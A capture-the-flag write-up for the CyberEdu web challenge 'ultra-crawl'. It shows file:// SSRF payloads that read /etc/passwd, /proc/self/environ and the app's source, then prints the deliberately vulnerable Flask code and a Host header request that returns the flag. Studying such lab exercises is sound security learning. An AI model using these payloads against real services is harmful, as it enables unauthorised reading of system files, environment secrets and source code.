---
title: "ultra-crawl — CyberEdu CTF"
description: "SSRF via file:// wrapper leads to source code disclosure, revealing a Host header bypass to read the flag."
pubDate: 2025-03-05
tags: ["web", "ssrf", "cyberedu"]
---

**Category:** Web / SSRF
**Flag:** Retrieved via Host header manipulation

## Challenge

> Here is your favorite proxy for crawling minimal websites.

The app accepts a URL and fetches it server-side — a proxy functionality that screams SSRF.

## Step 1 — SSRF via `file://`

The proxy doesn't restrict URL schemes. Using `file://` allows reading the local filesystem:

```
file:///etc/passwd
file:///proc/self/environ
```

Tried the classic `/home/ctf/flag.txt` — didn't work. The app is running in a Docker container, so I looked for the startup script:

```
file:///start.sh
```

Found it — it revealed where the Flask app source is located.

## Step 2 — Read the source code

```
file:///app/app.py
```

```python
import base64
from urllib.request import urlopen
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.headers['Host'] == "company.tld":
        flag = open('sir-a-random-folder-for-the-flag/flag.txt').read()
        return flag
    if request.method == 'POST':
        url = request.form.get('url')
        output = urlopen(url).read().decode('utf-8')
        if base64.b64decode("Y3Rmew==").decode('utf-8') in output:
            return "nope! try harder!"
        return output
    ...
```

The flag is served if the `Host` header equals `company.tld`. The filter blocks responses containing `ctf{` (base64 decoded value of `Y3Rmew==`).

## Step 3 — Host header bypass

Send a request to the proxy with `Host: company.tld`:

```http
POST / HTTP/1.1
Host: company.tld
Content-Type: application/x-www-form-urlencoded

url=http://localhost:5000/
```

The server checks its own `Host` header, matches `company.tld`, and returns the flag.

## Takeaways

- SSRF + `file://` = source code disclosure in Docker containers (check for `start.sh`).
- Security checks based on the `Host` header are bypassable when the attacker controls the request.
- Filtering output for flags is easily circumvented once source code is leaked.
